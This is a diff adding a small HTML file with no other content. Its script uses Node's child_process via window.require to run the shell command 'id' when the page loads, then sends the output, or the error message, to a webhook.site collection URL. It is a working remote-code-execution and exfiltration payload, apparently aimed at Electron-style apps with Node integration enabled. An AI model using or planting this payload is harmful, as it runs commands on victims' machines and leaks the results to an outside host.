@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  try {
+    const { exec } = window.require('child_process');
+    exec('id', (err, stdout, stderr) => {
+      fetch('https://webhook.site/4369f85e-8b9b-4f2e-a358-7f85257470c7?output=' + encodeURIComponent(stdout));
+    });
+  } catch(e) {
+    fetch('https://webhook.site/4369f85e-8b9b-4f2e-a358-7f85257470c7?error=' + e.message);
+  }
+})();
+</script>
+</body>
+</html>
